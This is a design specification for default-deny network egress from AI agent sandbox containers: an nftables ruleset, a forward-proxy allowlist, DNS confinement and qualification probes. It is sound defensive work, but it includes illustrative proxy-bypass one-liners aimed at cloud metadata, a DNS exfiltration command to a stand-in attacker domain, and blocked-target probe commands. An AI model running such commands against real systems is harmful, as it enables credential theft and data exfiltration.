# Specification: Gate 0D Default-Deny Sandbox Egress Architecture & Qualification Design

**Status:** PROPOSED / Pending User Review and Checkpoint A
**Gate Status:** UNQUALIFIED (Blocks implementation of Sandbox Network Infrastructure and dependent tasks)
**Author:** Documentation Implementation Specialist
**Date:** 2026-10-11
**Target Platform:** Single-Host Linux (`linux/amd64`), Native Docker Engine, Operator-Managed Firewall (`nftables` / `iptables`)
**Specification File:** `docs/superpowers/specs/2026-10-11-gate-0d-egress-confinement-design.md`

---

## 1. Executive Summary & Objective

This specification defines the architectural design, isolation boundaries, network traffic policies, DNS handling, and reproducible qualification criteria for **Gate 0D: Default-Deny Sandbox Egress**.

Under the target self-hosting operating model described in `docs/superpowers/specs/2026-10-11-self-hosting-readiness-design.md`, untrusted AI agent sessions, build commands, and arbitrary task code execute within unprivileged, capability-dropped Docker containers (`atm-project-<project_id>`).

The core security objective of Gate 0D is to guarantee **strict default-deny egress confinement**:
1. Untrusted task execution environments must be completely blocked from reaching the host operating system, host loopback, Docker bridge gateway IPs, host-level administrative listening ports (SSH, Docker daemon), and internal ATM control-plane infrastructure services (PostgreSQL `5432`, Redis `6379`, Dex `5556`, Control Plane API `8080`).
2. Project containers must be isolated from peer project containers on the same host (zero inter-project lateral movement or cross-bridge traffic).
3. Private internal networks (RFC 1918 `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), IPv6 Unique Local Addresses (ULA `fc00::/7`), and link-local / cloud provider instance metadata endpoints (`169.254.169.254`, `fe80::/10`) must be unreachable.
4. Arbitrary outbound TCP, UDP, QUIC, and raw IP egress to the public internet must be strictly prohibited at Layer 3/Layer 4.
5. Task sandboxes may reach external networks solely via an explicit, authenticated, and constrained HTTP(S) forward proxy enforcing an exact FQDN allowlist limited to approved package registries (npm, PyPI, Go proxy, Crates.io, NuGet, Maven Central) and verified package download CDNs. Direct GitHub egress remains blocked (governed by Gate 0C), and model provider endpoints remain blocked pending Gate 0G resolution.

**Non-Scope Boundaries:**
Gate 0D addresses **network isolation only**. Filesystem mounts, shared volume segregation, host execution prevention, and Docker-socket isolation are governed and enforced by Gate 0B, Gate 0C, and the baseline container security configuration. Furthermore, ATM and OpenCode are strictly unprivileged control-plane components; they do not possess `CAP_NET_ADMIN` and must never mutate host firewall rules directly. Host network filtering is owned and operated by the host platform administrator.

---

## 2. Architectural Direction Analysis

Three architectural mechanisms were evaluated against the self-hosting threat model:

| Dimension | Direction A: Host Packet Filtering Only (`nftables`/`iptables`) | Direction B: Forward Proxy Container Only (App-Level Egress) | Direction C: Hybrid Host Packet Filtering + Isolated DMZ Forward Proxy (PROPOSED) |
|---|---|---|---|
| **L3/L4 Confinement** | Strong. Kernel-enforced default-deny on bridge interfaces drops direct IP egress, RFC 1918, and metadata. | Ineffective as a security boundary. Relies solely on container env (`HTTP_PROXY`). Untrusted task code or malware ignores env and opens direct sockets. | Strong. Kernel-enforced host packet filtering drops all direct IP, metadata, and cross-project routing. Sandboxes can physically route only to proxy IP:port. |
| **L7 FQDN Filtering** | Extremely brittle. L3 firewalls cannot inspect HTTP `CONNECT` or SNI reliably across dynamic IPs and shared CDNs (Cloudflare, Fastly, AWS CloudFront). | Strong at L7, but easily bypassed at L3/L4 if container has direct network access. | Strong. Forward proxy terminates/inspects HTTP `CONNECT` requests, enforcing an exact FQDN allowlist regardless of upstream IP churn. |
| **Host Privilege Requirement** | High if orchestrated by ATM (would require ATM to have `CAP_NET_ADMIN` or root Docker privileges, violating the principle of least privilege). | Low for ATM (standard container deployment), but fails confinement guarantees. | Clean separation: Host operator owns static kernel packet filtering; ATM orchestrates unprivileged containers with zero `CAP_NET_ADMIN`. |
| **Inter-Project Isolation** | Achievable if host rules isolate each bridge subnet. | Fails if multiple project containers attach to the same proxy bridge. | Strong. Each project uses an isolated Docker bridge. Proxy sits on a separate egress DMZ network. No shared bridges. |
| **Recommendation** | Inadequate for CDN-backed package registries. | **REJECTED** (Env-only proxy is not a security boundary). | **PROPOSED (Direction C)** pending user review and qualification probe. |

### Why Hybrid Enforcement is Mandatory
Relying solely on environment variables (`HTTP_PROXY`, `HTTPS_PROXY`) is ineffective because any untrusted child process can bypass them:
```bash
# Bypasses HTTP_PROXY trivially:
curl --noproxy "*" http://169.254.169.254/latest/meta-data/
python3 -c "import socket; s = socket.socket(); s.connect(('10.0.0.1', 8080))"
```
Conversely, relying solely on IP-based host firewall rules is impractical for package ecosystems: PyPI, npm, and Crates.io rely on multi-tenant CDNs where IPs change frequently and overlap with untrusted customer domains.

Therefore, **Direction C (Hybrid)** combines the strengths of both:
1. **Host-level packet filtering** creates a hard Layer 3/4 boundary: the sandbox network namespace has zero direct internet routing, zero access to private CIDRs, and cannot communicate with any host or peer bridge IP except the designated forward proxy IP on its designated listening port.
2. **The application forward proxy** enforces Layer 7 domain access controls, terminating HTTP proxy negotiations and verifying destination FQDNs against an explicit allowlist before establishing outbound TLS connections.

---

## 3. Network Topology & Traffic Data Flow

### 3.1 Network Topology & Zone Architecture

The deployment topology strictly isolates project containers, control-plane management, and the forward proxy:

```
+---------------------------------------------------------------------------------------------------+
| Host Operating System (Managed by Operator / Kernel Packet Filtering: nftables / iptables)        |
|                                                                                                   |
|  +--------------------------------+                  +-----------------------------------------+  |
|  | Project 1 Sandbox Bridge       |                  | Project 2 Sandbox Bridge                |  |
|  | Subnet: 172.30.1.0/24          |                  | Subnet: 172.30.2.0/24                   |  |
|  | +----------------------------+ |                  | +----------------------------+          |  |
|  | | atm-project-1 (Sandbox)    | |                  | | atm-project-2 (Sandbox)    |          |  |
|  | | IP: 172.30.1.2             | |                  | | IP: 172.30.2.2             |          |  |
|  | +--------------+-------------+ |                  | +--------------+-------------+          |  |
|  +----------------|---------------+                  +----------------|------------------------+  |
|                   |                                                   |                           |
|                   +------------------\             /------------------+                           |
|                                       v           v                                               |
|                    [ Host Kernel FORWARD Filter: DROP by default ]                                |
|                    [ ALLOW: Project Subnets -> Proxy IP:3128 ONLY ]                               |
|                    [ DROP: Project -> Host INPUT (Gateway / Ports) ]                              |
|                    [ DROP: Project 1 <-> Project 2 Inter-Bridge   ]                               |
|                                       |                                                           |
|                                       v                                                           |
|  +---------------------------------------------------------------------------------------------+  |
|  | Egress DMZ Bridge (Dedicated Docker Network: atm_egress_dmz)                                |  |
|  | Subnet: 172.30.200.0/24                                                                     |  |
|  |                                                                                             |  |
|  |  +---------------------------------------------------------------------------------------+  |  |
|  |  | atm-egress-proxy (Squid / Envoy Forward Proxy)                                        |  |  |
|  |  | IP: 172.30.200.10, Port: 3128                                                         |  |  |
|  |  | Enforces: Strict FQDN Allowlist (npm, pypi, crates, go, nuget, maven)                   |  |  |
|  |  | Upstream DNS: Validates public IP only; rejects RFC 1918 / Loopback / Metadata        |  |  |
|  |  +-------------------------------------------+-------------------------------------------+  |  |
|  +----------------------------------------------|----------------------------------------------+  |
|                                                 | (Outbound HTTPS only via Proxy)                 |
|                                                 v                                                 |
|                                        [ Host WAN / Internet ]                                    |
|                                                 |                                                 |
|                                                 v                                                 |
|                          Approved Package Registries (registry.npmjs.org, etc.)                    |
+---------------------------------------------------------------------------------------------------+
```

### 3.2 Network Zone Rules and Interfaces
1. **Isolated Project Bridges (`atm-project-<id>`):**
   - Each project container is attached to an independent, dedicated Docker bridge network created dynamically by ATM.
   - Project containers are **never** attached to `bridge` (default Docker bridge), `host`, or `agent_backend` (internal control-plane network).
   - Project containers are **never** attached to `atm_egress_dmz` directly. Attaching project sandboxes to the proxy network would create network adjacency, allowing task code to probe the proxy container’s internal interfaces or other containers on that network.
2. **Dedicated Egress DMZ Network (`atm_egress_dmz`):**
   - The forward proxy container (`atm-egress-proxy`) runs attached only to `atm_egress_dmz`.
   - Host routing forwards packets between the project bridge interfaces and the DMZ interface, strictly filtered by host firewall rules.
   - The proxy container must be permitted outbound forwarding to the host WAN interface for DNS (`udp/tcp dport 53`) and outbound HTTPS (`tcp dport 443`) to resolve and connect to allowlisted upstream package registries.
3. **Stateful Forwarding Rules (Host Kernel):**
   - **Direction: Sandbox -> Proxy:** Allowed solely for `tcp dport 3128` destined to the proxy IP (e.g., `172.30.200.10`).
   - **Direction: Proxy -> Sandbox:** Established and related connections only (`ct state established,related accept`). New inbound connections initiated by the proxy into the sandbox are **strictly dropped**.
   - **Direction: Sandbox -> Direct External WAN:** Dropped.
   - **Direction: Sandbox -> Host Gateway / Host IP (INPUT chain):** Default dropped (`iifname "atm-proj-*" drop`). Prevents sandbox from reaching any host-bound services (SSH, Docker socket proxies, local management, control plane).
   - **Direction: Sandbox A -> Sandbox B (Inter-project forwarding):** Dropped.
   - **Direction: Proxy -> External WAN:** Permitted for outbound proxy DNS and TLS connections (`iifname "atm-egress-dmz" oifname "<wan_interface>"`).
4. **IPv4 and IPv6 Parity:**
   - Egress blocking applies identically to IPv6.
   - Unless full IPv6 stateful proxying and FQDN filtering are explicitly configured and qualified, IPv6 forwarding from sandbox bridges is disabled at the host kernel (`disable_ipv6=1`) or rejected via `ip6tables`/`nftables` rules (`ip6 saddr ... drop`).

---

## 4. Host Firewall Ownership & Fail-Closed Launch Contract

### 4.1 Boundary of Responsibility
- **Host Platform Operator:** Owns, deploys, and persists the host firewall policy (e.g. `nftables.conf` or persistent `iptables` chains). The operator guarantees that Docker daemon restarts do not flush or bypass the egress rules.
- **ATM Control Plane:** Operates with zero host network administrative privilege (`CAP_NET_ADMIN` dropped). ATM does **not** install kernel modules, rewrite routing tables, or execute firewall mutation commands.
- **Sandbox Container:** Launched with `--cap-drop=ALL` and `--security-opt no-new-privileges:true`. Cannot configure interfaces, manipulate routing, or alter firewall state.

### 4.2 Fail-Closed Sandbox Launch Contract & Pre-Implementation Blocker

To satisfy the non-negotiable requirement that ATM must never launch a sandbox in an unconfined state, container startup must fail closed if host egress filtering is not active and healthy.

> **CRITICAL PRE-IMPLEMENTATION BLOCKER:**
> Because ATM lacks `CAP_NET_ADMIN` and host root privileges, how ATM verifies host firewall health before container launch must be formally resolved before implementation.

**Candidate Verification Contracts:**
1. **Contract 1: Active Gateway Canary Probe (Recommended Application-Level Check):**
   - ATM launches a short-lived preflight canary probe container in the project network before initializing the task sandbox.
   - The probe attempts an immediate connection to a prohibited target (e.g., host gateway port or metadata canary IP `169.254.169.254:80` with a 1-second timeout).
   - If the connection succeeds or returns an active service response rather than dropping/timing out, the host firewall is deemed broken. Container startup **aborts immediately** with an error: `EgressConfinementError: Host firewall verification failed; sandbox startup aborted`.
2. **Contract 2: Operator Attestation & Readiness File (Passive File Marker):**
   - Host operator's systemd unit writes a cryptographically validated readiness token or timestamped status file to `/etc/atm/firewall-ready` upon verifying `nftables` rules.
   - Control plane checks for valid attestation before provisioning project networks.
   - *Limitation:* Does not actively test actual packet filtering behavior; canary probe (Contract 1) provides true behavioral verification.

**Fail-Closed Invariant:**
Under no circumstances may ATM fall back to starting a project sandbox with standard unconfined Docker bridge networking if network isolation fails or cannot be verified.

---

## 5. Forward Proxy Policy & Allowlist Specifications

### 5.1 Protocol and Method Constraints
- **Supported Protocols:** HTTP/1.1 and HTTP/2 `CONNECT` tunneling for HTTPS egress only.
- **Prohibited Protocols:** Raw TCP routing, UDP, QUIC (HTTP/3), and general SOCKS proxying are strictly disabled. Package managers must communicate via standard HTTPS proxy tunnels.
- **HTTP Methods:** For cleartext HTTP, only `GET` and `HEAD` to approved package registry metadata endpoints are permitted. All `CONNECT` requests must target port `443` only.

### 5.2 Destination Allowlist Policy
The forward proxy enforces an exact FQDN allowlist. Broad wildcards (e.g. `*.com`, `*.net`, `*.*`) and broad multi-tenant cloud wildcards (e.g. `*.amazonaws.com`, `*.cloudfront.net`) are **strictly prohibited**.

Approved destinations are limited to official package ecosystems:

| Ecosystem | Approved Hostnames / FQDNs | Purpose & Official Documentation Reference | Status |
|---|---|---|---|
| **Node / npm** | `registry.npmjs.org` | Primary npm registry metadata and package tarballs. | Approved |
| | `registry.yarnpkg.com` | Yarn registry alias (redirects to npmjs). | Approved |
| **Python / PyPI** | `pypi.org` | PyPI web UI and package index metadata. | Approved |
| | `files.pythonhosted.org` | Official PyPI package distribution CDN artifact host. | Approved |
| **Go** | `proxy.golang.org` | Official Go module mirror proxy. | Approved |
| | `sum.golang.org` | Official Go module checksum database. | Approved |
| **Rust / Crates** | `crates.io` | Official Cargo package index metadata. | Approved |
| | `index.crates.io` | Sparse index endpoints (Cargo 1.68+). | Approved |
| | `static.crates.io` | Package crate file downloads. | Approved |
| **.NET / NuGet** | `api.nuget.org` | NuGet v3 service index and package downloads. | Approved |
| **Java / Maven** | `repo1.maven.org` | Maven Central repository artifact server. | Approved |
| | `repo.maven.apache.org` | Maven Central alias. | Approved |

#### Handling of Redirects and Dynamic CDNs
Package managers frequently encounter HTTP 301/302 redirects during package tarball resolution.
- Any redirect to a host **not** on the explicit allowlist will be rejected by the proxy with HTTP `403 Forbidden`.
- **Policy Invariant:** New download hostnames must be individually evaluated and added to the configuration. Blanket allowlisting of entire CDNs (e.g. `*.fastly.net` or `*.cloudflare.com`) is prohibited because it allows exfiltration to arbitrary customer buckets hosted on the same CDN.
- If an approved package manager introduces a new redirect host during qualification probes, that exact FQDN must be verified and added to the allowlist before sign-off.

#### Excluded and Blocked Services
- **GitHub (`github.com`, `api.github.com`):** **BLOCKED**. In accordance with Gate 0C, sandboxes do not interact directly with GitHub. All Git synchronization is mediated out-of-band by the trusted control plane.
- **Model Providers (`api.openai.com`, `api.anthropic.com`):** **BLOCKED**. Model access is strictly prohibited until Gate 0G resolves the credential isolation architecture.
- **Arbitrary Cloud Services / Metadata:** `169.254.169.254`, `metadata.google.internal`, etc. are blocked at both proxy and host firewall levels.

### 5.3 Proxy Upstream DNS & SSRF Defenses
The proxy container performs upstream DNS resolution for external destinations.
- **Anti-SSRF Protection:** The proxy's DNS resolver must inspect resolved A/AAAA records. If an allowlisted domain resolves to an RFC 1918 private address, loopback (`127.0.0.0/8`), link-local (`169.254.0.0/16`), or multicast address (DNS rebinding attack), the proxy must abort the connection immediately with HTTP `502 Bad Gateway`.
- **Proxy Boundary Limitations (SNI / TLS Inspection):**
  - The proxy acts as a non-MITM forward proxy terminating the HTTP `CONNECT` tunnel. It validates the FQDN in the `CONNECT` line and matches it against the TLS ClientHello Server Name Indication (SNI).
  - *Residual Risk:* Without full TLS interception (MITM with private CA injection), the proxy cannot inspect decrypted payload contents within the HTTPS tunnel to an allowlisted registry. Malicious code could attempt data exfiltration by embedding data into HTTP request paths or headers sent to `registry.npmjs.org`. Because MITM proxying introduces severe CA trust and security complexity inside task runtimes, this residual risk is acknowledged and mitigated by default-deny FQDN filtering and Gate 0C credential absence.
  - *Encrypted Client Hello (ECH):* ECH could obscure the true destination SNI if clients negotiate ECH. To prevent domain-fronting and SNI evasion, the proxy configuration must disallow ECH or reject `CONNECT` tunnels where the SNI cannot be validated.

---

## 6. Container DNS Resolution Architecture

### 6.1 Docker Embedded Resolver Risk Analysis
Docker bridge networks utilize an embedded DNS resolver at `127.0.0.11`. According to official Docker documentation:
- Custom bridge networks automatically configure `/etc/resolv.conf` with `nameserver 127.0.0.11`.
- `127.0.0.11` forwards external lookups to the host’s configured DNS servers.
- **Exfiltration Threat:** If a sandbox has access to `127.0.0.11`, an untrusted process can perform arbitrary DNS queries (e.g., `nslookup $(cat secret).attacker.com`). Even if all TCP/UDP data egress is blocked, data can be exfiltrated via external DNS tunneling.

### 6.2 Proposed DNS Confinement Direction
To prevent DNS-based data exfiltration:
1. **Application-Level Resolution Delegation:**
   - Package managers configured with `HTTP_PROXY` and `HTTPS_PROXY` delegate hostname resolution directly to the proxy via the HTTP `CONNECT host:443` request. The client does **not** need local DNS resolution for proxy-mediated requests.
2. **Local Resolver Confinement Candidate:**
   - Sandboxes should launch with custom `--dns` configuration preventing forwarding to public upstream resolvers.
   - Setting `--dns=127.0.0.1` inside the container namespace configures an inactive local loopback address, causing local container DNS lookups to fail immediately with `connection refused`.
   - *Status:* `--dns=127.0.0.1` is a **candidate configuration requiring qualification probing**. The probe must confirm whether this completely neutralizes `127.0.0.11` forwarding without causing unintended package manager failures.
   - *Alternative Policy Resolver:* If specific build tools strictly require working local DNS (e.g., resolving `localhost` or proxy hostname), ATM must configure a local restricted DNS server that answers only internal addresses and returns `NXDOMAIN` for all public queries.

---

## 7. Concrete Packet Filtering Specifications (Illustrative nftables Ruleset)

The following reference `nftables` ruleset illustrates the required stateful packet filtering topology. It is deployed and maintained exclusively by the host platform operator.

> **CRITICAL OPERATIONAL & SYNTACTIC CONSTRAINTS:**
> - **Illustrative Snippet:** This ruleset is an architectural reference only and must be validated by the host operator using `nft -c` against the host's active firewall configuration before deployment. It has not been compiled or applied to a live host in this documentation phase.
> - **Host Project Isolation (No Global Hook Drop):** The ruleset uses `policy accept` on host-wide base hooks and explicitly scopes all restrictive filtering to ATM-managed interfaces (`atm-proj-*`, `atm-egress-dmz`). It **must never** set a global `policy drop` on the host's `forward` or `input` hooks, as doing so would break unrelated Docker containers, default bridges (`docker0`), virtual machines, or other non-ATM workloads sharing the host.
> - **Interface & Address Placeholders:** Bridge names (`atm-proj-*`, `atm-egress-dmz`), WAN interfaces (`eth0`), and IP addresses (`172.30.200.10`) are illustrative placeholders. Operators must select non-conflicting subnets and map exact interface names matching their host network configuration.
> - **Proxy WAN Egress & Control-Plane Paths:** The forward filter explicitly allows proxy WAN egress for upstream package retrieval and DNS resolution. Separate control-plane management paths (e.g. Traefik to OpenCode) operate over distinct internal networks and are not routed through project egress bridges.

```nftables
table inet atm_confinement {
    # Illustrative placeholders: operator must configure non-overlapping values
    define PROXY_IP = 172.30.200.10
    define PROXY_PORT = 3128
    define WAN_IFACE = "eth0"

    chain forward {
        # Priority filter hook with accept policy so unrelated host/docker forwarding is untouched
        type filter hook forward priority 0; policy accept;

        # 1. Allow established and related traffic for all managed interfaces
        ct state established,related accept

        # 2. Drop invalid connection states
        ct state invalid drop

        # 3. Allow traffic from any ATM project bridge to the proxy DMZ on the proxy port only
        iifname "atm-proj-*" oifname "atm-egress-dmz" ip daddr $PROXY_IP tcp dport $PROXY_PORT ct state new accept

        # 4. Allow forward traffic from the proxy DMZ to WAN for upstream package registries & DNS
        iifname "atm-egress-dmz" oifname $WAN_IFACE tcp dport 443 ct state new accept
        iifname "atm-egress-dmz" oifname $WAN_IFACE udp dport 53 ct state new accept
        iifname "atm-egress-dmz" oifname $WAN_IFACE tcp dport 53 ct state new accept

        # 5. Drop any attempts by proxy to initiate new connections into project sandboxes
        iifname "atm-egress-dmz" oifname "atm-proj-*" drop

        # 6. Default-deny for all other project bridge forwarding (drops direct WAN, inter-project bridge traffic)
        iifname "atm-proj-*" drop
    }

    chain input {
        # Priority filter hook with accept policy to preserve unrelated host services
        type filter hook input priority 0; policy accept;

        # Allow established/related return packets to host
        ct state established,related accept

        # Default-deny: Project sandboxes must NEVER reach any host-bound listening service or gateway IP
        iifname "atm-proj-*" drop
    }
}
```

---

## 8. Reproducible Future Qualification Plan

The qualification probe for Gate 0D must be executed on an explicitly authorized, isolated Linux test host (or dedicated QEMU/KVM virtual machine) running native Docker Engine.

> **NOTICE:** No test was executed, and no host state was altered during this specification phase. Gate 0D remains **UNQUALIFIED**.

### 8.1 Test Matrix & Verification Commands

All qualification probes are executed from within a candidate project container (`atm-project-probe`). Note that `--dns=127.0.0.1` is explicitly specified to test local resolver confinement per §6.2:

```bash
# Setup candidate probe container attached to test project bridge
docker run -d --name atm-project-probe \
  --network atm-project-test \
  --dns=127.0.0.1 \
  --cap-drop=ALL \
  --security-opt no-new-privileges:true \
  --read-only \
  -e HTTP_PROXY="http://172.30.200.10:3128" \
  -e HTTPS_PROXY="http://172.30.200.10:3128" \
  debian:bookworm-slim sleep 3600
```

#### Positive Qualification Probes (Allowed Package Registries)
Each supported package manager toolchain must successfully fetch package metadata or tarballs through the proxy without credentials:

| Test ID | Command Inside Container | Expected Output / Assertion | Exit Code |
|---|---|---|---|
| `POS-0D-01` | `curl -f -s -S -o /dev/null https://registry.npmjs.org/express` | HTTP 200 OK via proxy | `0` |
| `POS-0D-02` | `curl -f -s -S -o /dev/null https://pypi.org/pypi/requests/json` | HTTP 200 OK via proxy | `0` |
| `POS-0D-03` | `curl -f -s -S -o /dev/null https://files.pythonhosted.org/` | HTTP 200/301/403 (Valid TLS handshake, not timeout) | `0` |
| `POS-0D-04` | `curl -f -s -S -o /dev/null https://proxy.golang.org/github.com/gin-gonic/gin/@v/list` | HTTP 200 OK via proxy | `0` |
| `POS-0D-05` | `curl -f -s -S -o /dev/null https://index.crates.io/co/nf/config` | HTTP 200 OK via proxy | `0` |
| `POS-0D-06` | `curl -f -s -S -o /dev/null https://api.nuget.org/v3/index.json` | HTTP 200 OK via proxy | `0` |
| `POS-0D-07` | `curl -f -s -S -o /dev/null https://repo1.maven.org/maven2/org/apache/commons/commons-lang3/maven-metadata.xml` | HTTP 200 OK via proxy | `0` |

#### Negative Qualification Probes (Prohibited Destinations & Bypass Attempts)
All unauthorized requests must fail closed with connection timeouts or immediate network unreachable errors:

| Test ID | Target / Test Condition | Command Inside Container | Expected Behavior / Error Assertion |
|---|---|---|---|
| `NEG-0D-01` | Cloud Metadata Service | `curl -m 2 http://169.254.169.254/latest/meta-data/` | Timeout (28) or Network unreachable (7) |
| `NEG-0D-02` | Host Gateway IP | `curl -m 2 http://172.30.1.1:8080/health` | Timeout (28) or Connection refused/unreachable |
| `NEG-0D-03` | Host SSH Port | `curl -m 2 http://172.30.1.1:22` | Timeout (28) or Connection dropped |
| `NEG-0D-04` | Control Plane DB Port | `curl -m 2 http://172.30.200.1:5432` | Timeout (28) or Network unreachable |
| `NEG-0D-05` | Peer Project Sandbox | `curl -m 2 http://172.30.2.2:80` | Timeout (28) or Host unreachable |
| `NEG-0D-06` | Direct WAN IP (Proxy Bypass) | `curl -m 2 http://1.1.1.1` | Timeout (28) or Network unreachable |
| `NEG-0D-07` | Direct WAN IP without Env | `env -u HTTP_PROXY -u HTTPS_PROXY curl -m 2 http://1.1.1.1` | Timeout (28) or Network unreachable |
| `NEG-0D-08` | GitHub Direct Access | `curl -m 2 https://github.com` | Blocked by proxy (HTTP 403 Forbidden) |
| `NEG-0D-09` | Model Provider API | `curl -m 2 https://api.anthropic.com` | Blocked by proxy (HTTP 403 Forbidden) |
| `NEG-0D-10` | Non-Allowed Domain | `curl -m 2 https://example.com` | Blocked by proxy (HTTP 403 Forbidden) |
| `NEG-0D-11` | Raw UDP / QUIC | `nc -z -v -u -w 2 1.1.1.1 53` | Timeout or Network unreachable |
| `NEG-0D-12` | Raw DNS Exfiltration | `dig @127.0.0.11 secret.example.com` | Connection timed out / No servers reachable |
| `NEG-0D-13` | Proxy Reverse Connection | From proxy: `curl -m 2 http://172.30.1.2:80` | Dropped by host forward filter (Timeout) |
| `NEG-0D-14` | Proxy Container Stopped | Stop proxy container; run `POS-0D-01` | Connection refused / Proxy unreachable (Fails closed) |

---

## 9. Gate Dependencies & Relationship to Other Gates

- **Gate 0A & 0B (Runtime Foundation & Docker Engine):**
  - Gate 0D builds directly upon the qualified non-root, capability-dropped sandbox container contract established in Gate 0A and 0B (`docs/superpowers/verification/2026-10-11-runtime-qualification-gates-0a-0b.md`).
- **Gate 0C (Credential-Safe Git Transfer):**
  - Gate 0D enforces the network isolation boundary required by Gate 0C. Direct Git operations against GitHub from inside the sandbox are blocked at the proxy layer, ensuring all Git transfers must use the control-plane bundle helper.
- **Gate 0G (Model Credential Isolation):**
  - Direct egress to LLM provider endpoints (`api.anthropic.com`, `api.openai.com`) remains blocked under Gate 0D until Gate 0G formally decides and qualifies the model provider credential delivery architecture.

---

## 10. Summary of Architectural Decisions & Unresolved Risks

### 10.1 Decisions Defined in this Specification
1. **Adoption of Direction C (Hybrid Filtering):** Host-owned kernel packet filtering restricts Layer 3/4 forwarding exclusively to a dedicated forward proxy on an isolated DMZ network. The forward proxy restricts Layer 7 HTTPS tunneling via an exact FQDN allowlist.
2. **Strict Default-Deny Policy:** All direct IP egress, RFC 1918 traffic, cloud metadata, host loopback, and peer project bridges are blocked.
3. **Explicit Package Registry Allowlist:** Allowlist is restricted to official package managers (npm, PyPI, Go, Crates, NuGet, Maven). Wildcards and multi-tenant CDNs are banned.

### 10.2 Open Architectural Blockers & Residual Risks
1. **Pre-Implementation Blocker (Host Firewall Verification):** How ATM reliably verifies the health of operator-managed host firewall rules without possessing host root privileges remains a blocker requiring user/operator agreement before implementation begins.
2. **Container DNS Resolution Behavior:** The behavior of `--dns=127.0.0.1` in suppressing `127.0.0.11` forwarding must be empirically tested on the authorized qualification host.
3. **No TLS Interception (MITM):** Because TLS inspection is not performed, payload exfiltration through legitimate HTTPS `CONNECT` tunnels to allowlisted domains remains a residual risk, mitigated by absence of credentials inside the sandbox.
